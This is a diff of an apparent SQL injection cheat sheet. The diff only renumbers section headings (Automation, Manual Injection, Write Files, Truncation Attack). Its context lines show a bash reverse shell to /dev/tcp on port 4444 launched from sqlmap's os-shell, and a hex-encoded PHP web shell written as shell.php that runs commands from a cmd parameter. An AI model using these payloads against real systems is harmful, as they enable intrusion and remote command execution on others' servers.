@@ -6,7 +6,7 @@ alts: []
 render_with_liquid: true
 ---
 
-## 1. Automation
+## Automation
 
 - **Sqlmap**
 
@@ -66,7 +66,7 @@ render_with_liquid: true
         os-shell> bash -c 'bash -i >& /dev/tcp/<your-local-ip>/4444 0>&1'
         ```
 
-## 2. Manual Injection
+## Manual Injection
 
 1. **Comments**
 
@@ -262,7 +262,7 @@ render_with_liquid: true
 
 <br />
 
-## 3. Write Files
+## Write Files
 
 - Write new php file. '0x3C3F...' is hex ( <?php system($_GET["cmd"]) ?> in here )
 - Access to http://10.0.0.1/shell.php?cmd=whoami
@@ -274,7 +274,7 @@ render_with_liquid: true
 
 <br />
 
-## 4. Truncation Attack
+## Truncation Attack
 
 ```sh
 # If the table shema is like the following...
